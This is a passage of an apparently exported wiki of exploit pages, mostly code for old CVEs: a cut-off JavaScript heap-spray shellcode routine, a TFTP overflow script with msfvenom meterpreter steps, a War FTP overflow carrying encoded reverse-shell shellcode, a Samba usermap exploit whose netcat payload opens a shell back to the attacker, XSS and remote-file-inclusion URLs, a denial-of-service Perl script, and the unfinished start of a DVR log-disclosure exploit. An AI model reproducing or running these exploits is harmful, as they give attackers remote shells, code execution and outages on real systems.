    for (var i = 0; i &lt; 124/4; i++)
        tablaVirtual += this.direccion(direccionSaltoEjecucion);
    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.
    tablaVirtual += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              codigoConcha + pila.rellena((tamanio-138)/2 - codigoConcha.length);
    return tablaVirtual;
}

//reserva memoria
pilaLib.ie.prototype.escribeEnMemoria = function(numeroBytesBloque, etiquetaBloque) {
    var tamanio;
    // Calculate the allocation size
    if (typeof numeroBytesBloque == "string" || numeroBytesBloque instanceof String)
        tamanio = 4 + numeroBytesBloque.length*2 + 2;    // len + string data + null terminator
    else
        tamanio = numeroBytesBloque;
    // Make sure that the size is valid
    if (tamanio == 32 || tamanio == 64 || tamanio == 256 || tamanio == 32768)
        throw "Allocation sizes " + tamanio + " cannot be flushed out of the OLEAUT32 cache";
    // Allocate the block with the OLEAUT32 allocator
    this.escribeInts32Bits(numeroBytesBloque, etiquetaBloque);
}

pilaLib.ie.prototype.guardaTabla = function(tabla, numBloques) {
    var tamanio;
    // Calculate the allocation size
    if (typeof tabla == "string" || tabla instanceof String)
        tamanio = 4 + tabla.length*2 + 2;    // len + string data + null terminator
    else
        tamanio = tabla;
    // Make sure that the size is valid
    if ((tamanio &amp; 0xf) != 0)
        throw "Allocation size " + tamanio + " must be a multiple of 16";
    if (tamanio+8 &gt;= 1024)
        throw("Maximum lookaside block size is 1008 bytes");
    var numBloques = (numBloques ? numBloques : 1);
    for (var i = 0; i &lt; numBloques; i++)
        this.escribeEnMemoria(tabla, "tablaAliberar");
    this.libera("tablaAliberar");
}

pilaLib.ie.prototype.guardaBloqueInjector = function(contenidoBloqueInjector, numFilas) {
    var numFilas = (numFilas ? numFilas : 1);
    for (var i = 0; i &lt; numFilas; i++) {
        this.escribeEnMemoria(contenidoBloqueInjector,"e");//relleno
        this.escribeEnMemoria(contenidoBloqueInjector, "bloqueAliberar");
    }
    this.escribeEnMemoria(contenidoBloqueInjector,"e");//relleno
    this.libera("bloqueAliberar");
}

//depura sin usar la pila de STRINGs de la RAM
pilaLib.ie.prototype.depur = function(msg) {
    void(Math.atan2(0xbabe, msg));
}

pilaLib.ie.prototype.depurar = function(enable) {
    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}




&lt;/pre&gt;</text>
      <sha1>28s1rkm2zpmlsdn4ps49ka1645cuqr9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-6184 AT-TFTP1.9緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>624</id>
    <revision>
      <id>841</id>
      <timestamp>2021-04-01T03:20:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2006-6184 This is a python-based standalone exploit for CVE-2006-6184. This exploit triggers a stack-based buffer overflow in Allied Telesyn TFTP Server (..."</comment>
      <origin>841</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3986" sha1="tjizv1fdow0eir797vdonv0up0och2g" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2006-6184
This is a python-based standalone exploit for CVE-2006-6184. This exploit triggers a stack-based buffer overflow in Allied Telesyn TFTP Server (AT-TFTP) 1.9, and possibly earlier, allowing remote attackers to cause a denial of service or execute arbitrary code.

### Instructions (Updated for 2020)
The payload must be customized to include your own IP address and listening port, so you'll need to generate it manually.
To do so, use the following steps:
 
1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
```sh
perl -e 'print "\x81\xec\xac\x0d\x00\x00"' &gt; stackadj
```

2.) Next, use the following command to create a staged meterpreter shell payload:
```sh
msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=[your IP] LPORT=[your port] R &gt; payload
```

3.) Then, combine the two files you just created.
```sh
cat stackadj payload &gt; shellcode
```

4.) Finally, let's eliminate the bad characters.
```sh
msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python
```

Enter the output as the value of the "payload" variable. You may need to run this exploit a few times for it to work.

### Metasploit Listener
1. use exploit/multi/handler
2. set PAYLOAD windows/meterpreter/reverse_nonx_tcp
3. set ExitOnSession false
4. set AutoRunScript post/windows/manage/migrate
5. exploit -j


&lt;/pre&gt;


==atftp.py==
&lt;pre&gt;
#!/usr/bin/python
# Standalone exploit for Allied Telesyn TFTP Server 1.9
# Written by daleksec 07/21/2016
# Special thanks to NetSec.ws for the excellent walk through (see http://netsec.ws/?p=262)

import sys, socket
 
if len(sys.argv)&lt;=2:
 sys.exit('''Usage: python attftp_long_filename.py &lt;IP Address&gt; &lt;Port&gt; &lt;Your IP Address&gt; &lt;OS choice&gt;

 0	Windows NT SP4 English
 1	Windows 2000 SP0 English
 2	Windows 2000 SP1 English
 3	Windows 2000 SP2 English
 4	Windows 2000 SP3 English
 5	Windows 2000 SP4 English
 6	Windows XP SP0/1 English
 7	Windows XP SP2 English
 8	Windows XP SP3 English
 9	Windows Server 2003
 10	Windows Server 2003 SP2
 ''')
 
host	= sys.argv[1]		# Victim's IP
port	= int(sys.argv[2])	# Victim's Port
lhost	= sys.argv[3]		# Attacker's IP
os	= int(sys.argv[4])	# OS Choice
ret	= []			# Define array containing return addresses

# Define return addresses (Source: Metasploit)
ret = ["\xf7\xa6\x2e\x70",
	"\xc3\x62\x03\x75",
	"\x85\x1d\x03\x75",
	"\x1b\x43\x03\x75",
	"\x5a\x1c\xfe\x74",
	"\xce\x1d\x03\x75",
	"\xfb\x7b\xab\x71",
	"\x72\x93\xab\x71",
	"\x53\x93\x42\x7e",
	"\xd3\xfe\x86\x7c",
	"\x1b\xa0\x86\x7c"]

nop	= "\x90" * (25-len(lhost))	# Create a NOP string as to bring NOPs + LHOST up to 25 bytes

# The payload must be customized to include your own IP address and listening port, so you'll need to generate it manually.
# To do so, use the following steps:
# 1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' &gt; stackadj
# 2.) Next, use the following command to create a staged meterpreter shell payload:
# msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=[your IP] LPORT=[your port] R &gt; payload
# 3.) Then, combine the two files you just created.
# cat stackadj payload &gt; shellcode
# 4.) Finally, let's eliminate the bad characters.
# msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python
# Enter the output as the value of the "payload" variable. You may need to run this exploit a few times for it to work.

payload	= "" # Payload (bad characters = \x00, stack adjustment = -3500, can't exceed 210 bytes of space)
# payload += ""
# payload += ""
# ...

exploit	= "\x00\x02" + nop + payload + ret[os] + "\x83\xc4\x28\xc3\x00netascii\x00" 	# Our exploit so far 

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# Declare a UDP socket
client.sendto(exploit, (host, port))				# Send the exploit over UDP to the nominated addresses

&lt;/pre&gt;</text>
      <sha1>tjizv1fdow0eir797vdonv0up0och2g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-1567 War FTP Daemon 1.65堆棧緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>625</id>
    <revision>
      <id>842</id>
      <timestamp>2021-04-01T03:22:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==warftp-ftp.py== &lt;pre&gt; #!/usr/bin/python  import socket  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 774699BF   FFE4             JMP ESP  # bad characters \x00\x..."</comment>
      <origin>842</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2566" sha1="ifzen76x62d9tj8knu8omp2xb3jvu0w" xml:space="preserve">==warftp-ftp.py==
&lt;pre&gt;
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 774699BF   FFE4             JMP ESP

# bad characters \x00\x0a\x0d 

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.123 LPORT=443 -f c EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -a x86 --platform windows

shellcode = ("\xd9\xed\xba\xda\x93\x0e\xa1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x55\x17\x83\xc5\x04\x03\x8f\x80\xec\x54\xd3\x4f\x72"
"\x96\x2b\x90\x13\x1e\xce\xa1\x13\x44\x9b\x92\xa3\x0e\xc9\x1e"
"\x4f\x42\xf9\x95\x3d\x4b\x0e\x1d\x8b\xad\x21\x9e\xa0\x8e\x20"
"\x1c\xbb\xc2\x82\x1d\x74\x17\xc3\x5a\x69\xda\x91\x33\xe5\x49"
"\x05\x37\xb3\x51\xae\x0b\x55\xd2\x53\xdb\x54\xf3\xc2\x57\x0f"
"\xd3\xe5\xb4\x3b\x5a\xfd\xd9\x06\x14\x76\x29\xfc\xa7\x5e\x63"
"\xfd\x04\x9f\x4b\x0c\x54\xd8\x6c\xef\x23\x10\x8f\x92\x33\xe7"
"\xed\x48\xb1\xf3\x56\x1a\x61\xdf\x67\xcf\xf4\x94\x64\xa4\x73"
"\xf2\x68\x3b\x57\x89\x95\xb0\x56\x5d\x1c\x82\x7c\x79\x44\x50"
"\x1c\xd8\x20\x37\x21\x3a\x8b\xe8\x87\x31\x26\xfc\xb5\x18\x2f"
"\x31\xf4\xa2\xaf\x5d\x8f\xd1\x9d\xc2\x3b\x7d\xae\x8b\xe5\x7a"
"\xd1\xa1\x52\x14\x2c\x4a\xa3\x3d\xeb\x1e\xf3\x55\xda\x1e\x98"
"\xa5\xe3\xca\x0f\xf5\x4b\xa5\xef\xa5\x2b\x15\x98\xaf\xa3\x4a"
"\xb8\xd0\x69\xe3\x53\x2b\xfa\xcc\x0c\x32\x81\xa4\x4e\x34\x74"
"\x8e\xc6\xd2\x1c\xe0\x8e\x4d\x89\x99\x8a\x05\x28\x65\x01\x60"
"\x6a\xed\xa6\x95\x25\x06\xc2\x85\xd2\xe6\x99\xf7\x75\xf8\x37"
"\x9f\x1a\x6b\xdc\x5f\x54\x90\x4b\x08\x31\x66\x82\xdc\xaf\xd1"
"\x3c\xc2\x2d\x87\x07\x46\xea\x74\x89\x47\x7f\xc0\xad\x57\xb9"
"\xc9\xe9\x03\x15\x9c\xa7\xfd\xd3\x76\x06\x57\x8a\x25\xc0\x3f"
"\x4b\x06\xd3\x39\x54\x43\xa5\xa5\xe5\x3a\xf0\xda\xca\xaa\xf4"
"\xa3\x36\x4b\xfa\x7e\xf3\x6b\x19\xaa\x0e\x04\x84\x3f\xb3\x49"
"\x37\xea\xf0\x77\xb4\x1e\x89\x83\xa4\x6b\x8c\xc8\x62\x80\xfc"
"\x41\x07\xa6\x53\x61\x02")

buffer = "A" * 485 + "\xbf\x99\x46\x77" + "\x90" * 20 + shellcode + "C" * (5500-485-4)

try:
	print "\nSending evil buffer..."
	s.connect(("192.168.1.131", 21))
	s.recv(1024)
	s.send('USER ' + buffer + '\r\n')
	data=s.recv(1024)
	print "\nDone!."
except:
	print "Could not connect to FTP!"
	

&lt;/pre&gt;

==ftp-user-fuzz.py==
&lt;pre&gt;
#!/usr/bin/python

import socket

buffer = ["A"]
counter=100

while len(buffer) &lt; 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing USER with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(("192.168.1.131", 21))
	s.recv(1024)
	s.send('USER ' + string + '\r\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close()


&lt;/pre&gt;</text>
      <sha1>ifzen76x62d9tj8knu8omp2xb3jvu0w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-2447 Samba 3.0.0任意命令執行漏洞</title>
    <ns>0</ns>
    <id>626</id>
    <revision>
      <id>843</id>
      <timestamp>2021-04-01T03:23:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CVE-2007-2447 ====  CVE-2007-2447 - Samba usermap script. &lt;/br&gt; https://amriunix.com/post/cve-2007-2447-samba-usermap-script/  ## Usage: ```shell $ python userm..."</comment>
      <origin>843</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2079" sha1="o82lgpcju1ochxdr6qspxob6zlhc9n5" xml:space="preserve">==INFO==
&lt;pre&gt;
CVE-2007-2447
====

CVE-2007-2447 - Samba usermap script.
&lt;/br&gt;
https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

## Usage:
```shell
$ python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
```
  * `RHOST` -- The target address
  * `RPORT` -- The target port (TCP : 139)
  * `LHOST` -- The listen address
  * `LPORT` -- The listen port

## Installation

    sudo apt install python python-pip
    pip install --user pysmb
    git clone https://github.com/amriunix/CVE-2007-2447.git

### Disclaimer:

All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.

&lt;/pre&gt;



==usermap_sctipt.py==
&lt;pre&gt;
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0&lt;/tmp/hago | /bin/sh &gt;/tmp/hago 2&gt;&amp;1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)

&lt;/pre&gt;</text>
      <sha1>o82lgpcju1ochxdr6qspxob6zlhc9n5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-3830 ISS Proventia Network IPS GX5108 1.3/1.5 XSS漏洞</title>
    <ns>0</ns>
    <id>627</id>
    <revision>
      <id>844</id>
      <timestamp>2021-04-01T03:25:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; https://www.example.com/alert.php?reminder=--&gt;//"&gt;&lt;script&gt;alert(/XSS_vulnerability_proventia_s0x by Alex Hernandez/);&lt;/script&gt; &lt;/pre&gt;"</comment>
      <origin>844</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="147" sha1="lb1f6v9zrcifad4bqcrw4qhdwwy1rkm" xml:space="preserve">==XSS==
&lt;pre&gt;
https://www.example.com/alert.php?reminder=--&gt;//"&gt;&lt;script&gt;alert(/XSS_vulnerability_proventia_s0x by Alex Hernandez/);&lt;/script&gt;
&lt;/pre&gt;</text>
      <sha1>lb1f6v9zrcifad4bqcrw4qhdwwy1rkm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-3831 ISS Proventia Network IPS GX5108 1.3/1.5 任意PHP代碼執行漏洞</title>
    <ns>0</ns>
    <id>628</id>
    <revision>
      <id>845</id>
      <timestamp>2021-04-01T03:27:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; http://www.example.com/index.php?title=http://www.example2.com/C99.php?archive.php https://www.example.com/main.php?page=https://www.example2.com &lt;/pre&gt;"</comment>
      <origin>845</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="166" sha1="r5phev28b2tr6fnvjdecrw1rr66u7hy" xml:space="preserve">==EXP==
&lt;pre&gt;
http://www.example.com/index.php?title=http://www.example2.com/C99.php?archive.php
https://www.example.com/main.php?page=https://www.example2.com
&lt;/pre&gt;</text>
      <sha1>r5phev28b2tr6fnvjdecrw1rr66u7hy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-4607 Postcast Server Pro 3.0.61緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>629</id>
    <revision>
      <id>846</id>
      <timestamp>2021-04-01T03:29:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # https://joeyrideout.com/reworking-decade-old-exploit-code/ # Python 2.7.15 32-bit PoC of https://www.exploit-db.com/exploits/10007/. # WIP  # First, register D..."</comment>
      <origin>846</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="821" sha1="icfj5uqeaoy2x2qmne34p148k3b0e55" xml:space="preserve">==POC==
&lt;pre&gt;
# https://joeyrideout.com/reworking-decade-old-exploit-code/
# Python 2.7.15 32-bit PoC of https://www.exploit-db.com/exploits/10007/.
# WIP

# First, register DLL with Windows regsvr32 (for the brave! Use a VM.)
# Admin CMD:&gt; regsvr32 .\emsmtp.dll
# (After, unregister with regsvr32 -u .\emsmtp.dll)


# Then set up python:
# Install 32-bit (x86): https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
# Then: pip install pywin32
import win32com.client
emlib = win32com.client.Dispatch("EasyMail.SMTP")

# Exploit calls for &gt;99999 chars passed to SubmitToExpress method
aaa = "A"*199999
assert(10 == emlib.SubmitToExpress(aaa))  # Returns INT(10) if safe? (no crash)
assert(10 == emlib.SubmitToExpress(aaa*100))  # Why not more?

print "Done. EasyMail SMTP SubmitToExpress appears to be safe."

&lt;/pre&gt;</text>
      <sha1>icfj5uqeaoy2x2qmne34p148k3b0e55</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-5306 ELSEIF CMS Beta 0.6敏感信息泄漏漏洞</title>
    <ns>0</ns>
    <id>630</id>
    <revision>
      <id>847</id>
      <timestamp>2021-04-01T03:31:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/perl -w #									 # Airsensor M520 HTTPD Remote Preauth Denial Of Service and Buffer Overflow PoC		 #									 # The vulnerability is caused due to a..."</comment>
      <origin>847</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6611" sha1="78uqhub9hogclehm2czlb0ho39v3lay" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/perl -w
#									
# Airsensor M520 HTTPD Remote Preauth Denial Of Service and Buffer Overflow PoC		
#									
# The vulnerability is caused due to an unspecified error in the cgis	
# files filter used for configure propierties. This can be exploited by	
# sending a specially crafted HTTPS request (necessary authentication), 
# which will cause the HTTPS service on the system to crash.		
#									
# Requisites: "Use DHCP" option interface mark "No"		
#									
# Examples:								
# 									
# GET https://192.168.100.100/adLog.cgi?%41%41%41 HTTP/1.1		
# GET https://192.168.100.100/post.cgi?%41%41%41 HTTP/1.1		
# GET https://192.168.100.100/ad.cgi?%41%41%41 HTTP/1.1			
# 									
# Pinging:								
#									
# Before:								
#									
# Reply from 192.168.100.100: bytes=32 time&lt;1ms TTL=64			
# Reply from 192.168.100.100: bytes=32 time&lt;1ms TTL=64			
# Reply from 192.168.100.100: bytes=32 time&lt;1ms TTL=64			
#									
# After:								
#									
# Hardware error.							
# Hardware error.							
# Hardware error.							
# Request timed out.							
# Request timed out.							
# Request timed out.							
#									
# C:\&gt;nc -vvn 192.168.100.100 443					
# (UNKNOWN) [192.168.100.100] 443 (?): connection refused		
# sent 0, rcvd 0: NOTSOCK						
#
# Buffer Overflow debug log:
#
# 1970-01-01 00:00:15   SYS-INFO:: AirDefense Firmware Version 4.4.1.4, Model = M520
# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR EXCEPTION ERROR
# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR VERSION NUMBER: 4.4.1.4
# 1970-01-01 00:00:15   SYS-CRIT:: SENSOR Up Time:  00:08:51
# 1970-01-01 00:00:15   SYS-CRIT:: Time of Exception: 1970-01-01 00:08:55
# 1970-01-01 00:00:15   SYS-CRIT:: Exception ID = 10 ( Reserved Instruction)
# 1970-01-01 00:00:15   SYS-CRIT:: Thread = HTTPD
# 1970-01-01 00:00:15   SYS-CRIT:: MIPS Register Dump:
# 1970-01-01 00:00:15   SYS-CRIT::  zero=0x00000000    at=0xfffffffe    v0=0x00000000    v1=0x00000000
# 1970-01-01 00:00:16   SYS-CRIT::    a0=0x00000000    a1=0x3d000000    a2=0x00000010    a3=0x00000041
# 1970-01-01 00:00:16   SYS-CRIT::    t0=0x00000000    t1=0x0000003d    t2=0x0000000b    t3=0x00000000
# 1970-01-01 00:00:16   SYS-CRIT::    t4=0x802f799c    t5=0xf43dd40f    t6=0x0066a1a4    t7=0x4df0e494
# 1970-01-01 00:00:16   SYS-CRIT::    s0=0x802f7dbf    s1=0x0000001f    s2=0x802f7910    s3=0x80120000
# 1970-01-01 00:00:16   SYS-CRIT::    s4=0x80120000    s5=0x80986c30    s6=0x80120000    s7=0x80128afc
# 1970-01-01 00:00:16   SYS-CRIT::    t8=0x480ec8cd    t9=0x742b7136    k0=0x802f78c8    k1=0x802f7910
# 1970-01-01 00:00:16   SYS-CRIT::    gp=0x8015b070    sp=0x802f7910    fp=0x80128aec    ra=0x800b2534
# 1970-01-01 00:00:16   SYS-CRIT:: Address of instruction that caused exception = 0x800b2534
# 1970-01-01 00:00:16   SYS-CRIT:: Memory address at which adress exception occured = 0x00000000
# 1970-01-01 00:00:16   SYS-CRIT:: Return address = 0x800b2534
# 1970-01-01 00:00:17   SYS-CRIT:: Status Reg = 0x1000af03
# 1970-01-01 00:00:17   SYS-CRIT:: Cache Reg = 0x00000000
# 1970-01-01 00:00:17   SYS-CRIT:: Cause Reg = 0x30000028
# 1970-01-01 00:00:17   SYS-CRIT:: Config Reg = 0x03fffbfb
# 1970-01-01 00:00:17   SYS-CRIT:: Vector = 40
# 1970-01-01 00:00:17   SYS-CRIT:: Processor Version = 0x00018009
# 1970-01-01 00:00:17   SYS-CRIT:: Stack Trace Begin: "-&gt;" = return address
# 1970-01-01 00:00:17   SYS-CRIT::   [802f7910]=0x802f7dbf
# 1970-01-01 00:00:17   SYS-CRIT::   [802f7914]=0x00000000
# 1970-01-01 00:00:17   SYS-CRIT::   [802f7918]=0x00000000
# 1970-01-01 00:00:19   SYS-CRIT::   [802f7990]=0x80130000
# 1970-01-01 00:00:19   SYS-CRIT::   [802f7994]=0x802f7db4
# 1970-01-01 00:00:19   SYS-CRIT::   [802f7998]=0x80152e18
# 1970-01-01 00:00:19   SYS-CRIT::   [802f799c]=0x80152ed8
# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a0]=0x802f7dbf
# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a4]=0x80986c30
# 1970-01-01 00:00:19   SYS-CRIT::   [802f79a8]=0x802f8200
# 1970-01-01 00:00:19   SYS-CRIT:: -&gt;[802f79ac]=0x800f0450	&lt;- return address
# 1970-01-01 00:00:19   SYS-CRIT::   [802f79b0]=0x0d0a0074
# 1970-01-01 00:00:21   SYS-CRIT:: Stack Trace End:
#									
# The vulnerability has been reported in versions Airdefense		
#
# Firmware Version 4.3.1.1, Model = M520
# Firmware version 4.4.1.4, Model = M520				
# 
# More information: 	http://www.airdefense.net
#			http://support.airdefense.net
#
# Very special credits: str0ke, Kf, rathaous, !dsr, 0dd.
#				
# and friends: nitr0us, crypkey, dex, xdawn, sirdarckcat, kuza55, 
# pikah, codebreak, h3llfyr3
#					
# Alex Hernandez ahernandez [at] sybsecurity dot com
#

use strict;
use LWP;
use Data::Dumper;
require HTTP::Request;
require HTTP::Headers;

my $string = 	"%41%41%41";			# Strings to send
my $method = 	'GET';				# Method "GET" or "POST"
my $uri = 	'https://192.168.100.100';	# Factory default IP address 
my $content = 	"/adLog.cgi?";			# Cgi's file to crash

#my $content = 	"/ad.cgi?";
#my $content = 	"/post.cgi?";
#my $content = 	"/logout.cgi?";

my $headers = HTTP::Headers-&gt;new(

'Host:'                	=&gt; '192.168.100.100',
'User-Agent:'          	=&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
'Accept:'              	=&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
'Accept-Language:'     	=&gt; 'en-us,en;q=0.5',
'Accept-Charset:'   	=&gt; 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',     
'Keep-Alive:'          	=&gt; '300',
'Connection:'          	=&gt; 'keep-alive',
'Referer:'       	=&gt; 'https://192.168.100.100/adLog.cgi?submitButton=refresh&amp;refresh=Refresh',
'Authorization:'	=&gt; 'Basic YWRtaW46YWlyc2Vuc29y', # base64 encode admin:airsensor

);

my $request = HTTP::Request-&gt;new($method, $uri, $headers, $content, $string);

my $ua = LWP::UserAgent-&gt;new;
my $response = $ua-&gt;request($request);

print "[+] Denial of Service exploit for Airsensor M520 Final\n";
print "[+] Coded by: Alex Hernandez [ahernandez\@sybsecurity.com]\n";
print "[+] We got this response from sensor: \n\n" . $response-&gt;content . "\n";

my $data;
	foreach my $pair (split('&amp;', $response-&gt;content)) {
 		my ($k, $v) = split('=', $pair);
 		$data-&gt;{$k} = $v;
}

if ($data-&gt;{RESULT} != 0) {

	print "[+] Denial of Service exploit for Airsensor M520 Final\n";
	print "[+] Coded by: Alex Hernandez[ahernandez\@sybsecurity.com]\n";
	print "[+] Use:\n";
	print "\tperl -x dos_sensor.pl\n";
 	print $data-&gt;{RESPMSG} . "\n";
	exit(0);

} else {

 	print "[+] Denial of service Exploit successed!!!\n";
	print "[+] By Alex Hernandez[ahernandez\@sybsecurity.com]\n";
}

# milw0rm.com [2007-09-18]
&lt;/pre&gt;</text>
      <sha1>78uqhub9hogclehm2czlb0ho39v3lay</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2007-6638 March Networks DVR 3204敏感信息泄漏漏洞</title>
    <ns>0</ns>
    <id>631</id>
    <revision>
      <id>848</id>
      <timestamp>2021-04-01T03:34:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/perl # # March Networks DVR 3204 Logfile Information Disclosure Exploit # # Since configuration of the IP address, user console and root is  # carried..."</comment>
      <origin>848</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3250" sha1="rp67i5ac5qafrpl48tjic37uc930tvd" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/perl
#
# March Networks DVR 3204 Logfile Information Disclosure Exploit
#
# Since configuration of the IP address, user console and root is 
# carried out over the "administrator console", the vulnerability 
# lies within Watchdog's HTTP server application.
#
# Any user can obtain the log files without authentication by accessing
# the following PATH http:/dvraddress/scripts/logfiles.tar.gz. The intruder
# can then uncompress the tar file and access the config.dat to reveal
# username and passwords, names of devices, and IP addresses of other 
# security components attached to the corporate networ
#
# More details: 
# http://www.sybsecurity.com/resources/static/
# An_Insecurity_Overview_of_the_March_Networks_DVR-CCTV_3204.pdf
#
# By Alex Hernandez ahernandez [at] sybsecurity [dot] com
#
# Usage: perl -x dvr3204_exp.pl www.marchnetworks.com:80
# Usage: perl -x dvr3204_exp.pl 127.0.0.1:80
#
# $ perl -x dvr3204_exp.pl 10.50.10.246:80
# Trying...
#
# THIS HOST IS VULNERABLE!!! :-)
# Check the details on w w w [dot] sybsecurity [dot] c o m
#
# THIS HOST IS NOT VULNERABLE :-(
# Check the settings on browser...
#
# 

use Socket;

if ($#ARGV&lt;0) {die "
\nMarch Networks DVR 3204 exploit\n
More details: http://www.sybsecurity.com
By Alex Hernandez\n 
ahernandez [at] sybsecurity [dot] com\n

Usage: perl -x $0 www.marchnetworks.com:80
Usage: perl -x $0 127.0.0.1:80\n\n";}

($host,$port)=split(/:/,@ARGV[0]);

print "Trying...\n\n";
$target = inet_aton($host);
$flag=0;

my @results=sendraw("GET /Level1Authenticate.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /UserAuthenticate.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/index.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeStatus.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeHistory.htm HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/UpgradeHistory.txt HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

my @results=sendraw("GET /public/dvrlog HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

